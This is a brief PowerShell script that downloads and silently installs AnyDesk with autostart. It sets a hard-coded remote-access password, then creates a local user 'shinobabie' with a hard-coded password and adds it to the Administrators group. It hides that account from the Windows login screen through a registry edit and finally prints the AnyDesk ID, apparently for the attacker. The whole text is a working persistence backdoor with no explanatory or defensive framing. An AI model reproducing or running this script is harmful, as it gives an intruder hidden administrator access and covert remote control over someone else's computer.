Function AnyDesk {
        mkdir "C:\ProgramData\AnyDesk"
        $clnt = new-object System.Net.WebClient
        $url = "http://download.anydesk.com/AnyDesk.exe"
        $file = "C:\ProgramData\AnyDesk.exe"
        $clnt.DownloadFile($url,$file)
        cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
        cmd.exe /c echo shinoany | C:\ProgramData\AnyDesk\anydesk.exe --set-password
        net user shinobabie 270795123@a! /add
        net localgroup administrators shinobabie /add
        reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v shinobabie /t REG_DWORD /d 0 /f
        sleep 10
        cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
}
AnyDesk
